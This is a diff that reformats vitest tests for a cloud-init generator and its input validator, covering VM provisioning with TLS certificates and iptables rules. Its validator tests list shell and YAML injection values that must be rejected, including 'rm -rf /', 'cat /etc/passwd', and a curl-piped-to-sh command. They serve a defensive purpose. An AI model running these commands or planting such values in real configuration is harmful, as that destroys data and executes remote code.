@@ -8,12 +8,7 @@
  */
 import { describe, it, expect } from 'vitest';
 import YAML from 'yaml';
-import {
-  generateCloudInit,
-  validateCloudInitSize,
-  validateCloudInitVariables,
-  indentForYamlBlock,
-} from '../src/generate';
+import { generateCloudInit, validateCloudInitSize, validateCloudInitVariables, indentForYamlBlock } from '../src/generate';
 import type { CloudInitVariables } from '../src/generate';
 
 function baseVariables(overrides?: Partial<CloudInitVariables>): CloudInitVariables {
@@ -107,9 +102,7 @@ describe('generateCloudInit', () => {
 
       expect(config).toContain('Environment=NODE_ID=node-test-123');
       expect(config).toContain('Environment=CONTROL_PLANE_URL=https://api.test.example.com');
-      expect(config).toContain(
-        'Environment=JWKS_ENDPOINT=https://api.test.example.com/.well-known/jwks.json'
-      );
+      expect(config).toContain('Environment=JWKS_ENDPOINT=https://api.test.example.com/.well-known/jwks.json');
       expect(config).toContain('Environment=CALLBACK_TOKEN=cb-token-abc');
       expect(config).toContain('hostname: sam-test-node');
     });
@@ -118,9 +111,7 @@ describe('generateCloudInit', () => {
       const config = generateCloudInit(baseVariables());
       const parsed = YAML.parse(config);
 
-      const workspaceUser = parsed.users.find(
-        (user: { name: string }) => user.name === 'workspace'
-      );
+      const workspaceUser = parsed.users.find((user: { name: string }) => user.name === 'workspace');
       expect(workspaceUser).toBeDefined();
       expect(workspaceUser).not.toHaveProperty('ssh_authorized_keys');
     });
@@ -134,13 +125,11 @@ describe('generateCloudInit', () => {
     });
 
     it('substitutes custom journald values', () => {
-      const config = generateCloudInit(
-        baseVariables({
-          logJournalMaxUse: '1G',
-          logJournalKeepFree: '2G',
-          logJournalMaxRetention: '14day',
-        })
-      );
+      const config = generateCloudInit(baseVariables({
+        logJournalMaxUse: '1G',
+        logJournalKeepFree: '2G',
+        logJournalMaxRetention: '14day',
+      }));
 
       expect(config).toContain('SystemMaxUse=1G');
       expect(config).toContain('SystemKeepFree=2G');
@@ -158,11 +147,9 @@ describe('generateCloudInit', () => {
     });
 
     it('substitutes custom Docker DNS servers when provided', () => {
-      const config = generateCloudInit(
-        baseVariables({
-          dockerDnsServers: '"10.0.0.1", "10.0.0.2"',
-        })
-      );
+      const config = generateCloudInit(baseVariables({
+        dockerDnsServers: '"10.0.0.1", "10.0.0.2"',
+      }));
       expect(config).toContain('"dns": ["10.0.0.1", "10.0.0.2"]');
       expect(config).not.toContain('1.1.1.1');
     });
@@ -170,12 +157,10 @@ describe('generateCloudInit', () => {
 
   describe('projectId and chatSessionId substitution', () => {
     it('substitutes projectId and chatSessionId when provided', () => {
-      const config = generateCloudInit(
-        baseVariables({
-          projectId: 'proj-abc-123',
-          chatSessionId: 'sess-def-456',
-        })
-      );
+      const config = generateCloudInit(baseVariables({
+        projectId: 'proj-abc-123',
+        chatSessionId: 'sess-def-456',
+      }));
 
       expect(config).toContain('Environment=PROJECT_ID=proj-abc-123');
       expect(config).toContain('Environment=CHAT_SESSION_ID=sess-def-456');
@@ -191,12 +176,10 @@ describe('generateCloudInit', () => {
     });
 
     it('produces empty values when projectId is explicitly undefined', () => {
-      const config = generateCloudInit(
-        baseVariables({
-          projectId: undefined,
-          chatSessionId: undefined,
-        })
-      );
+      const config = generateCloudInit(baseVariables({
+        projectId: undefined,
+        chatSessionId: undefined,
+      }));
 
       expect(config).toContain('Environment=PROJECT_ID=');
       expect(config).toContain('Environment=CHAT_SESSION_ID=');
@@ -204,23 +187,19 @@ describe('generateCloudInit', () => {
     });
 
     it('handles projectId without chatSessionId', () => {
-      const config = generateCloudInit(
-        baseVariables({
-          projectId: 'proj-only',
-        })
-      );
+      const config = generateCloudInit(baseVariables({
+        projectId: 'proj-only',
+      }));
 
       expect(config).toContain('Environment=PROJECT_ID=proj-only');
       expect(config).toContain('Environment=CHAT_SESSION_ID=');
     });
 
     it('env vars appear in systemd service section', () => {
-      const config = generateCloudInit(
-        baseVariables({
-          projectId: 'proj-123',
-          chatSessionId: 'sess-456',
-        })
-      );
+      const config = generateCloudInit(baseVariables({
+        projectId: 'proj-123',
+        chatSessionId: 'sess-456',
+      }));
 
       const serviceSection = config.split('[Service]')[1]?.split('[Install]')[0];
       expect(serviceSection).toBeDefined();
@@ -266,12 +245,10 @@ describe('generateCloudInit', () => {
 
   describe('TLS certificate injection', () => {
     it('sets VM_AGENT_PORT=8443 and TLS paths when cert provided', () => {
-      const config = generateCloudInit(
-        baseVariables({
-          originCaCert: REALISTIC_CERT,
-          originCaKey: REALISTIC_KEY,
-        })
-      );
+      const config = generateCloudInit(baseVariables({
+        originCaCert: REALISTIC_CERT,
+        originCaKey: REALISTIC_KEY,
+      }));
 
       expect(config).toContain('Environment=VM_AGENT_PORT=8443');
       expect(config).toContain('Environment=TLS_CERT_PATH=/etc/sam/tls/origin-ca.pem');
@@ -287,12 +264,10 @@ describe('generateCloudInit', () => {
     });
 
     it('key file has restricted permissions (0600)', () => {
-      const config = generateCloudInit(
-        baseVariables({
-          originCaCert: REALISTIC_CERT,
-          originCaKey: REALISTIC_KEY,
-        })
-      );
+      const config = generateCloudInit(baseVariables({
+        originCaCert: REALISTIC_CERT,
+        originCaKey: REALISTIC_KEY,
+      }));
 
       expect(config).toMatch(/origin-ca-key\.pem[\s\S]*?permissions:\s*'0600'/);
     });
@@ -307,12 +282,10 @@ describe('generateCloudInit', () => {
      * See: docs/notes/2026-03-12-tls-yaml-indentation-postmortem.md
      */
     it('full multi-line cert PEM survives YAML generation intact', () => {
-      const config = generateCloudInit(
-        baseVariables({
-          originCaCert: REALISTIC_CERT,
-          originCaKey: REALISTIC_KEY,
-        })
-      );
+      const config = generateCloudInit(baseVariables({
+        originCaCert: REALISTIC_CERT,
+        originCaKey: REALISTIC_KEY,
+      }));
 
       // Parse the generated YAML — this is the critical test.
       // If indentation is wrong, YAML.parse() will either throw or
@@ -329,12 +302,10 @@ describe('generateCloudInit', () => {
     });
 
     it('full multi-line key PEM survives YAML generation intact', () => {
-      const config = generateCloudInit(
-        baseVariables({
-          originCaCert: REALISTIC_CERT,
-          originCaKey: REALISTIC_KEY,
-        })
-      );
+      const config = generateCloudInit(baseVariables({
+        originCaCert: REALISTIC_CERT,
+        originCaKey: REALISTIC_KEY,
+      }));
 
       const parsed = YAML.parse(config);
 
@@ -348,15 +319,13 @@ describe('generateCloudInit', () => {
     });
 
     it('generated YAML is valid and parseable with realistic certs', () => {
-      const config = generateCloudInit(
-        baseVariables({
-          originCaCert: REALISTIC_CERT,
-          originCaKey: REALISTIC_KEY,
-          projectId: 'proj-123',
-          chatSessionId: 'sess-456',
-          taskId: 'task-789',
-        })
-      );
+      const config = generateCloudInit(baseVariables({
+        originCaCert: REALISTIC_CERT,
+        originCaKey: REALISTIC_KEY,
+        projectId: 'proj-123',
+        chatSessionId: 'sess-456',
+        taskId: 'task-789',
+      }));
 
       const parsed = YAML.parse(config);
       expect(parsed.hostname).toBe('sam-test-node');
@@ -365,25 +334,21 @@ describe('generateCloudInit', () => {
     });
 
     it('config with realistic TLS certs stays within 32KB limit', () => {
-      const config = generateCloudInit(
-        baseVariables({
-          originCaCert: REALISTIC_CERT,
-          originCaKey: REALISTIC_KEY,
-          projectId: 'proj-123',
-          chatSessionId: 'sess-456',
-        })
-      );
+      const config = generateCloudInit(baseVariables({
+        originCaCert: REALISTIC_CERT,
+        originCaKey: REALISTIC_KEY,
+        projectId: 'proj-123',
+        chatSessionId: 'sess-456',
+      }));
 
       expect(validateCloudInitSize(config)).toBe(true);
     });
 
     it('handles empty cert/key gracefully (no TLS mode)', () => {
-      const config = generateCloudInit(
-        baseVariables({
-          originCaCert: '',
-          originCaKey: '',
-        })
-      );
+      const config = generateCloudInit(baseVariables({
+        originCaCert: '',
+        originCaKey: '',
+      }));
 
       const parsed = YAML.parse(config);
       expect(parsed.write_files).toBeDefined();
@@ -411,12 +376,10 @@ describe('generateCloudInit', () => {
     });
 
     it('firewall script contains correct VM agent port (TLS mode)', () => {
-      const config = generateCloudInit(
-        baseVariables({
-          originCaCert: REALISTIC_CERT,
-          originCaKey: REALISTIC_KEY,
-        })
-      );
+      const config = generateCloudInit(baseVariables({
+        originCaCert: REALISTIC_CERT,
+        originCaKey: REALISTIC_KEY,
+      }));
       const parsed = YAML.parse(config);
 
       const firewallScript = parsed.write_files.find(
@@ -446,12 +409,8 @@ describe('generateCloudInit', () => {
       // Trusted interfaces are INSERTed (-I) at position 1 so they take priority
       // over the port-level DROP rules.
       expect(content).toContain('iptables -I INPUT 1 -i lo -j ACCEPT');
-      expect(content).toContain(
-        'iptables -I INPUT 1 -i docker0 -p tcp --dport "$VM_AGENT_PORT" -j ACCEPT'
-      );
-      expect(content).toContain(
-        'iptables -I INPUT 1 -i br-+ -p tcp --dport "$VM_AGENT_PORT" -j ACCEPT'
-      );
+      expect(content).toContain('iptables -I INPUT 1 -i docker0 -p tcp --dport "$VM_AGENT_PORT" -j ACCEPT');
+      expect(content).toContain('iptables -I INPUT 1 -i br-+ -p tcp --dport "$VM_AGENT_PORT" -j ACCEPT');
       // No conntrack ESTABLISHED,RELATED dependency — policy ACCEPT means
       // outbound reply packets don't need a state entry to come back.
       expect(content).not.toContain('conntrack --ctstate ESTABLISHED,RELATED');
@@ -539,9 +498,7 @@ describe('generateCloudInit', () => {
         (f: { path: string }) => f.path === '/etc/sam/firewall/setup-firewall.sh'
       );
       expect(firewallScript.content).toContain('iptables-save > /etc/iptables/rules.v4');
-      expect(firewallScript.content).toContain(
-        'ip6tables-save > /etc/iptables/rules.v6 2>/dev/null || true'
-      );
+      expect(firewallScript.content).toContain('ip6tables-save > /etc/iptables/rules.v6 2>/dev/null || true');
     });
 
     it('writes valid placeholder iptables persistence files before firewall setup runs', () => {
@@ -616,12 +573,8 @@ describe('generateCloudInit', () => {
       // Trusted-interface ACCEPTs are INSERTED at position 1 so they take
       // priority over the targeted DROP rules appended earlier.
       expect(content).toContain('ip6tables -I INPUT 1 -i lo -j ACCEPT');
-      expect(content).toContain(
-        'ip6tables -I INPUT 1 -i docker0 -p tcp --dport "$VM_AGENT_PORT" -j ACCEPT'
-      );
-      expect(content).toContain(
-        'ip6tables -I INPUT 1 -i br-+ -p tcp --dport "$VM_AGENT_PORT" -j ACCEPT'
-      );
+      expect(content).toContain('ip6tables -I INPUT 1 -i docker0 -p tcp --dport "$VM_AGENT_PORT" -j ACCEPT');
+      expect(content).toContain('ip6tables -I INPUT 1 -i br-+ -p tcp --dport "$VM_AGENT_PORT" -j ACCEPT');
       // Policy stays ACCEPT; targeted DROP on VM_AGENT_PORT does the restriction.
       expect(content).toContain('ip6tables -P INPUT ACCEPT');
       expect(content).toContain('ip6tables -A INPUT -p tcp --dport "$VM_AGENT_PORT" -j DROP');
@@ -647,15 +600,13 @@ describe('generateCloudInit', () => {
     // NOTE: debconf preseed is now handled by vm-agent provision package.
 
     it('config with firewall stays within 32KB Hetzner limit', () => {
-      const config = generateCloudInit(
-        baseVariables({
-          originCaCert: REALISTIC_CERT,
-          originCaKey: REALISTIC_KEY,
-          projectId: 'proj-123',
-          chatSessionId: 'sess-456',
-          taskId: 'task-789',
-        })
-      );
+      const config = generateCloudInit(baseVariables({
+        originCaCert: REALISTIC_CERT,
+        originCaKey: REALISTIC_KEY,
+        projectId: 'proj-123',
+        chatSessionId: 'sess-456',
+        taskId: 'task-789',
+      }));
 
       expect(validateCloudInitSize(config)).toBe(true);
     });
@@ -832,9 +783,7 @@ describe('generateCloudInit', () => {
       // Delete must come before insert for idempotency
       expect(deleteIdx).toBeLessThan(insertIdx);
       // Delete ignores error if rule doesn't exist yet
-      expect(content).toContain(
-        'iptables -D DOCKER-USER -d "$METADATA_IP" -j DROP 2>/dev/null || true'
-      );
+      expect(content).toContain('iptables -D DOCKER-USER -d "$METADATA_IP" -j DROP 2>/dev/null || true');
     });
 
     it('metadata block script uses METADATA_IP variable for the well-known endpoint', () => {
@@ -907,12 +856,10 @@ describe('generateCloudInit', () => {
 
   describe('no template placeholders remain', () => {
     it('all {{ ... }} placeholders are replaced', () => {
-      const config = generateCloudInit(
-        baseVariables({
-          projectId: 'proj-test',
-          chatSessionId: 'sess-test',
-        })
-      );
+      const config = generateCloudInit(baseVariables({
+        projectId: 'proj-test',
+        chatSessionId: 'sess-test',
+      }));
 
       const remaining = config.match(/\{\{[^.][^}]*\}\}/g);
       expect(remaining).toBeNull();
@@ -922,12 +869,10 @@ describe('generateCloudInit', () => {
 
 describe('validateCloudInitSize', () => {
   it('accepts config within 32KB limit', () => {
-    const config = generateCloudInit(
-      baseVariables({
-        projectId: 'proj-abc-123',
-        chatSessionId: 'sess-def-456',
-      })
-    );
+    const config = generateCloudInit(baseVariables({
+      projectId: 'proj-abc-123',
+      chatSessionId: 'sess-def-456',
+    }));
 
     expect(validateCloudInitSize(config)).toBe(true);
   });
@@ -938,15 +883,13 @@ describe('validateCloudInitSize', () => {
   });
 
   it('config with all variables set stays within 32KB', () => {
-    const config = generateCloudInit(
-      baseVariables({
-        projectId: 'proj-' + 'a'.repeat(100),
-        chatSessionId: 'sess-' + 'b'.repeat(100),
-        logJournalMaxUse: '2G',
-        logJournalKeepFree: '4G',
-        logJournalMaxRetention: '30day',
-      })
-    );
+    const config = generateCloudInit(baseVariables({
+      projectId: 'proj-' + 'a'.repeat(100),
+      chatSessionId: 'sess-' + 'b'.repeat(100),
+      logJournalMaxUse: '2G',
+      logJournalKeepFree: '4G',
+      logJournalMaxRetention: '30day',
+    }));
 
     expect(validateCloudInitSize(config)).toBe(true);
   });
@@ -959,57 +902,41 @@ describe('validateCloudInitVariables', () => {
     });
 
     it('accepts ULID-style nodeId (uppercase alphanumeric)', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            nodeId: '01HXYZ9ABC123DEF456',
-          })
-        )
-      ).not.toThrow();
+      expect(() => validateCloudInitVariables(baseVariables({
+        nodeId: '01HXYZ9ABC123DEF456',
+      }))).not.toThrow();
     });
 
     it('accepts lowercase nodeId with hyphens', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            nodeId: 'node-abc-123',
-          })
-        )
-      ).not.toThrow();
+      expect(() => validateCloudInitVariables(baseVariables({
+        nodeId: 'node-abc-123',
+      }))).not.toThrow();
     });
 
     it('accepts hostname with dots (FQDN style)', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            hostname: 'node-abc.sammy.party',
-          })
-        )
-      ).not.toThrow();
+      expect(() => validateCloudInitVariables(baseVariables({
+        hostname: 'node-abc.sammy.party',
+      }))).not.toThrow();
     });
 
     it('accepts all optional fields with valid values', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            projectId: 'proj-abc-123',
-            chatSessionId: 'sess-def-456',
-            taskId: 'task-ghi-789',
-            taskMode: 'conversation',
-            vmAgentPort: '8443',
-            cfIpFetchTimeout: '30',
-            logJournalMaxUse: '1G',
-            logJournalKeepFree: '2G',
-            logJournalMaxRetention: '14day',
-            dockerDnsServers: '"10.0.0.1", "10.0.0.2"',
-            devcontainerCacheEnabled: 'true',
-            deployAcmeEmail: 'ops@example.com',
-            deployAcmeCa: 'https://acme-staging-v02.api.letsencrypt.org/directory',
-            deployComposeCmd: '/usr/local/bin/docker compose',
-            deployHealthTimeout: '1m30s',
-          })
-        )
-      ).not.toThrow();
+      expect(() => validateCloudInitVariables(baseVariables({
+        projectId: 'proj-abc-123',
+        chatSessionId: 'sess-def-456',
+        taskId: 'task-ghi-789',
+        taskMode: 'conversation',
+        vmAgentPort: '8443',
+        cfIpFetchTimeout: '30',
+        logJournalMaxUse: '1G',
+        logJournalKeepFree: '2G',
+        logJournalMaxRetention: '14day',
+        dockerDnsServers: '"10.0.0.1", "10.0.0.2"',
+        devcontainerCacheEnabled: 'true',
+        deployAcmeEmail: 'ops@example.com',
+        deployAcmeCa: 'https://acme-staging-v02.api.letsencrypt.org/directory',
+        deployComposeCmd: '/usr/local/bin/docker compose',
+        deployHealthTimeout: '1m30s',
+      }))).not.toThrow();
     });
 
     it('accepts omitted optional fields', () => {
@@ -1017,428 +944,262 @@ describe('validateCloudInitVariables', () => {
     });
 
     it('accepts empty string for optional ID fields', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            projectId: '',
-            chatSessionId: '',
-            taskId: '',
-          })
-        )
-      ).not.toThrow();
+      expect(() => validateCloudInitVariables(baseVariables({
+        projectId: '',
+        chatSessionId: '',
+        taskId: '',
+      }))).not.toThrow();
     });
 
     it('accepts valid port numbers at boundaries', () => {
       expect(() => validateCloudInitVariables(baseVariables({ vmAgentPort: '1' }))).not.toThrow();
-      expect(() =>
-        validateCloudInitVariables(baseVariables({ vmAgentPort: '65535' }))
-      ).not.toThrow();
-      expect(() =>
-        validateCloudInitVariables(baseVariables({ vmAgentPort: '8080' }))
-      ).not.toThrow();
-      expect(() =>
-        validateCloudInitVariables(baseVariables({ vmAgentPort: '8443' }))
-      ).not.toThrow();
+      expect(() => validateCloudInitVariables(baseVariables({ vmAgentPort: '65535' }))).not.toThrow();
+      expect(() => validateCloudInitVariables(baseVariables({ vmAgentPort: '8080' }))).not.toThrow();
+      expect(() => validateCloudInitVariables(baseVariables({ vmAgentPort: '8443' }))).not.toThrow();
     });
 
     it('accepts all valid journald time units', () => {
       for (const unit of ['us', 'ms', 's', 'min', 'h', 'day', 'week', 'month', 'year']) {
-        expect(() =>
-          validateCloudInitVariables(
-            baseVariables({
-              logJournalMaxRetention: `7${unit}`,
-            })
-          )
-        ).not.toThrow();
+        expect(() => validateCloudInitVariables(baseVariables({
+          logJournalMaxRetention: `7${unit}`,
+        }))).not.toThrow();
       }
     });
 
     it('accepts all valid journald size suffixes', () => {
       for (const suffix of ['K', 'M', 'G', 'T', '']) {
-        expect(() =>
-          validateCloudInitVariables(
-            baseVariables({
-              logJournalMaxUse: `500${suffix}`,
-            })
-          )
-        ).not.toThrow();
+        expect(() => validateCloudInitVariables(baseVariables({
+          logJournalMaxUse: `500${suffix}`,
+        }))).not.toThrow();
       }
     });
 
     it('accepts JWT-style callbackToken', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            callbackToken: 'eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJub2RlLTEyMyJ9.signature_base64',
-          })
-        )
-      ).not.toThrow();
+      expect(() => validateCloudInitVariables(baseVariables({
+        callbackToken: 'eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJub2RlLTEyMyJ9.signature_base64',
+      }))).not.toThrow();
     });
   });
 
   describe('rejects shell metacharacters', () => {
     it('rejects nodeId with command substitution', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            nodeId: '$(rm -rf /)',
-          })
-        )
-      ).toThrow('nodeId');
+      expect(() => validateCloudInitVariables(baseVariables({
+        nodeId: '$(rm -rf /)',
+      }))).toThrow('nodeId');
     });
 
     it('rejects nodeId with backtick injection', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            nodeId: '`whoami`',
-          })
-        )
-      ).toThrow('nodeId');
+      expect(() => validateCloudInitVariables(baseVariables({
+        nodeId: '`whoami`',
+      }))).toThrow('nodeId');
     });
 
     it('rejects nodeId with semicolon command chaining', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            nodeId: 'valid; rm -rf /',
-          })
-        )
-      ).toThrow('nodeId');
+      expect(() => validateCloudInitVariables(baseVariables({
+        nodeId: 'valid; rm -rf /',
+      }))).toThrow('nodeId');
     });
 
     it('rejects nodeId with pipe', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            nodeId: 'valid|cat /etc/passwd',
-          })
-        )
-      ).toThrow('nodeId');
+      expect(() => validateCloudInitVariables(baseVariables({
+        nodeId: 'valid|cat /etc/passwd',
+      }))).toThrow('nodeId');
     });
 
     it('rejects hostname with newline injection', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            hostname: 'valid\nmalicious',
-          })
-        )
-      ).toThrow('hostname');
+      expect(() => validateCloudInitVariables(baseVariables({
+        hostname: 'valid\nmalicious',
+      }))).toThrow('hostname');
     });
 
     it('rejects hostname with spaces', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            hostname: 'valid host',
-          })
-        )
-      ).toThrow('hostname');
+      expect(() => validateCloudInitVariables(baseVariables({
+        hostname: 'valid host',
+      }))).toThrow('hostname');
     });
 
     it('rejects callbackToken with shell metacharacters', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            callbackToken: 'token; rm -rf /',
-          })
-        )
-      ).toThrow('callbackToken');
+      expect(() => validateCloudInitVariables(baseVariables({
+        callbackToken: 'token; rm -rf /',
+      }))).toThrow('callbackToken');
     });
 
     it('rejects projectId with shell metacharacters', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            projectId: 'proj$(cmd)',
-          })
-        )
-      ).toThrow('projectId');
+      expect(() => validateCloudInitVariables(baseVariables({
+        projectId: 'proj$(cmd)',
+      }))).toThrow('projectId');
     });
 
     it('rejects dockerDnsServers with shell injection', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            dockerDnsServers: '"1.1.1.1"; rm -rf /',
-          })
-        )
-      ).toThrow('dockerDnsServers');
+      expect(() => validateCloudInitVariables(baseVariables({
+        dockerDnsServers: '"1.1.1.1"; rm -rf /',
+      }))).toThrow('dockerDnsServers');
     });
 
     it('rejects deployment compose command shell injection', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            deployComposeCmd: 'docker compose; curl https://example.com/x | sh',
-          })
-        )
-      ).toThrow('deployComposeCmd');
+      expect(() => validateCloudInitVariables(baseVariables({
+        deployComposeCmd: 'docker compose; curl https://example.com/x | sh',
+      }))).toThrow('deployComposeCmd');
     });
 
     it('rejects deployment ACME email newline injection', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            deployAcmeEmail: 'ops@example.com\nEnvironment=DEPLOY_COMPOSE_CMD=sh',
-          })
-        )
-      ).toThrow('deployAcmeEmail');
+      expect(() => validateCloudInitVariables(baseVariables({
+        deployAcmeEmail: 'ops@example.com\nEnvironment=DEPLOY_COMPOSE_CMD=sh',
+      }))).toThrow('deployAcmeEmail');
     });
   });
 
   describe('rejects invalid formats', () => {
     it('rejects empty nodeId', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            nodeId: '',
-          })
-        )
-      ).toThrow('nodeId');
+      expect(() => validateCloudInitVariables(baseVariables({
+        nodeId: '',
+      }))).toThrow('nodeId');
     });
 
     it('rejects empty hostname', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            hostname: '',
-          })
-        )
-      ).toThrow('hostname');
+      expect(() => validateCloudInitVariables(baseVariables({
+        hostname: '',
+      }))).toThrow('hostname');
     });
 
     it('rejects empty controlPlaneUrl', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            controlPlaneUrl: '',
-          })
-        )
-      ).toThrow('controlPlaneUrl');
+      expect(() => validateCloudInitVariables(baseVariables({
+        controlPlaneUrl: '',
+      }))).toThrow('controlPlaneUrl');
     });
 
     it('rejects HTTP (non-HTTPS) controlPlaneUrl', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            controlPlaneUrl: 'http://api.example.com',
-          })
-        )
-      ).toThrow('controlPlaneUrl');
+      expect(() => validateCloudInitVariables(baseVariables({
+        controlPlaneUrl: 'http://api.example.com',
+      }))).toThrow('controlPlaneUrl');
     });
 
     it('rejects HTTP (non-HTTPS) deployAcmeCa', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            deployAcmeCa: 'http://acme.example.com/directory',
-          })
-        )
-      ).toThrow('deployAcmeCa');
+      expect(() => validateCloudInitVariables(baseVariables({
+        deployAcmeCa: 'http://acme.example.com/directory',
+      }))).toThrow('deployAcmeCa');
     });
 
     it('rejects invalid deployAcmeEmail', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            deployAcmeEmail: 'not-an-email',
-          })
-        )
-      ).toThrow('deployAcmeEmail');
+      expect(() => validateCloudInitVariables(baseVariables({
+        deployAcmeEmail: 'not-an-email',
+      }))).toThrow('deployAcmeEmail');
     });
 
     it('rejects invalid deployHealthTimeout', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            deployHealthTimeout: 'five minutes',
-          })
-        )
-      ).toThrow('deployHealthTimeout');
+      expect(() => validateCloudInitVariables(baseVariables({
+        deployHealthTimeout: 'five minutes',
+      }))).toThrow('deployHealthTimeout');
     });
 
     it('rejects vmAgentPort of 0', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            vmAgentPort: '0',
-          })
-        )
-      ).toThrow('vmAgentPort');
+      expect(() => validateCloudInitVariables(baseVariables({
+        vmAgentPort: '0',
+      }))).toThrow('vmAgentPort');
     });
 
     it('rejects vmAgentPort above 65535', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            vmAgentPort: '70000',
-          })
-        )
-      ).toThrow('vmAgentPort');
+      expect(() => validateCloudInitVariables(baseVariables({
+        vmAgentPort: '70000',
+      }))).toThrow('vmAgentPort');
     });
 
     it('rejects non-numeric vmAgentPort', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            vmAgentPort: 'abc',
-          })
-        )
-      ).toThrow('vmAgentPort');
+      expect(() => validateCloudInitVariables(baseVariables({
+        vmAgentPort: 'abc',
+      }))).toThrow('vmAgentPort');
     });
 
     it('rejects invalid taskMode', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            taskMode: 'invalid',
-          })
-        )
-      ).toThrow('taskMode');
+      expect(() => validateCloudInitVariables(baseVariables({
+        taskMode: 'invalid',
+      }))).toThrow('taskMode');
     });
 
     it('rejects invalid logJournalMaxUse format', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            logJournalMaxUse: '500MB',
-          })
-        )
-      ).toThrow('logJournalMaxUse');
+      expect(() => validateCloudInitVariables(baseVariables({
+        logJournalMaxUse: '500MB',
+      }))).toThrow('logJournalMaxUse');
     });
 
     it('rejects invalid logJournalMaxRetention format', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            logJournalMaxRetention: '7days',
-          })
-        )
-      ).toThrow('logJournalMaxRetention');
+      expect(() => validateCloudInitVariables(baseVariables({
+        logJournalMaxRetention: '7days',
+      }))).toThrow('logJournalMaxRetention');
     });
   });
 
   describe('edge cases', () => {
     it('rejects nodeId with Unicode characters', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            nodeId: 'node-\u00e9\u00e8',
-          })
-        )
-      ).toThrow('nodeId');
+      expect(() => validateCloudInitVariables(baseVariables({
+        nodeId: 'node-\u00e9\u00e8',
+      }))).toThrow('nodeId');
     });
 
     it('rejects nodeId with null bytes', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            nodeId: 'node\x00id',
-          })
-        )
-      ).toThrow('nodeId');
+      expect(() => validateCloudInitVariables(baseVariables({
+        nodeId: 'node\x00id',
+      }))).toThrow('nodeId');
     });
 
     it('rejects hostname with path traversal', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            hostname: '../../../etc/passwd',
-          })
-        )
-      ).toThrow('hostname');
+      expect(() => validateCloudInitVariables(baseVariables({
+        hostname: '../../../etc/passwd',
+      }))).toThrow('hostname');
     });
 
     it('rejects controlPlaneUrl with YAML injection', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            controlPlaneUrl: 'https://api.example.com\n  malicious_key: value',
-          })
-        )
-      ).toThrow('controlPlaneUrl');
+      expect(() => validateCloudInitVariables(baseVariables({
+        controlPlaneUrl: 'https://api.example.com\n  malicious_key: value',
+      }))).toThrow('controlPlaneUrl');
     });
 
     it('rejects controlPlaneUrl with dollar sign (systemd expansion risk)', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            controlPlaneUrl: 'https://api.example.com/$HOME/path',
-          })
-        )
-      ).toThrow('controlPlaneUrl');
+      expect(() => validateCloudInitVariables(baseVariables({
+        controlPlaneUrl: 'https://api.example.com/$HOME/path',
+      }))).toThrow('controlPlaneUrl');
     });
 
     it('rejects controlPlaneUrl with single-quote', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            controlPlaneUrl: "https://api.example.com/it's",
-          })
-        )
-      ).toThrow('controlPlaneUrl');
+      expect(() => validateCloudInitVariables(baseVariables({
+        controlPlaneUrl: "https://api.example.com/it's",
+      }))).toThrow('controlPlaneUrl');
     });
 
     it('rejects unquoted DNS server values', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            dockerDnsServers: '1.1.1.1',
-          })
-        )
-      ).toThrow('dockerDnsServers');
+      expect(() => validateCloudInitVariables(baseVariables({
+        dockerDnsServers: '1.1.1.1',
+      }))).toThrow('dockerDnsServers');
     });
 
     it('rejects DNS server with invalid octet count', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            dockerDnsServers: '"1.1.1"',
-          })
-        )
-      ).toThrow('dockerDnsServers');
+      expect(() => validateCloudInitVariables(baseVariables({
+        dockerDnsServers: '"1.1.1"',
+      }))).toThrow('dockerDnsServers');
     });
 
     it('accepts properly quoted DNS servers', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            dockerDnsServers: '"10.0.0.1", "10.0.0.2"',
-          })
-        )
-      ).not.toThrow();
+      expect(() => validateCloudInitVariables(baseVariables({
+        dockerDnsServers: '"10.0.0.1", "10.0.0.2"',
+      }))).not.toThrow();
     });
 
